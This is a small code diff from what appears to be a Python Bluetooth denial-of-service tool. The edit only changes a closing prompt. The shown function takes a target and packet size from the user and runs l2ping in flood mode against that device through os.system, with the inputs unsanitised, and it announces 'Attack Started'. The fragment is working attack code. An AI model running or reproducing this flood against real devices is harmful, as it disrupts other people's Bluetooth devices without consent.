@@ -8,5 +8,5 @@ def DOS():
     packet = input(f"[{c}+{r}] packet   {c}:{r} ")
     print(f"[{c}+{r}] {target} {packet} Attack Started...")
     os.system(f"l2ping -i hci0 -s {packet} -f {target}")
-    input()
+    input(f"[{c}+{r}] Finish{c}...{r}")
 
